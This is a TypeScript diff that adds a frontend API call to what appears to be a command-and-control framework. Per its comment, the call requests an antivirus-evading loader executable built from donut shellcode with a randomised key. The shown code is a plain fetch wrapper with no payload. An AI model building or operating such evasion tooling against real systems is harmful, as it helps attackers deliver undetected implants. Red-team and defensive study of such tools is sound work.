@@ -1348,6 +1348,22 @@ export const api = {
       server: r.headers.get("X-Agent-Server") || "",
     };
   },
+  // c2LoaderGenerate 免杀加载器：donut shellcode → 技术模板（随机密钥）→ 交叉编译 exe。
+  c2LoaderGenerate: async (payload: { listener_id: string; technique: string }): Promise<{ blob: Blob; filename: string }> => {
+    const token = getToken();
+    const r = await fetch("/api/tools/c2/loader-generate", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", ...(token ? { Authorization: `Bearer ${token}` } : {}) },
+      body: JSON.stringify(payload),
+    });
+    if (!r.ok) {
+      const t = await r.text().catch(() => "");
+      throw new Error(t || `loader-generate ${r.status}`);
+    }
+    const cd = r.headers.get("Content-Disposition") || "";
+    const m = /filename="([^"]+)"/.exec(cd);
+    return { blob: await r.blob(), filename: m?.[1] || "loader.exe" };
+  },
   c2Plugins: () => get<{ data: { id: number; name: string; description: string; commands: string[]; builtin: boolean }[] }>("/tools/c2/plugins"),
   c2PluginCreate: (payload: { name: string; description?: string; commands: string[] }) =>
     post<{ ok: boolean; id: number }>("/tools/c2/plugins", payload),
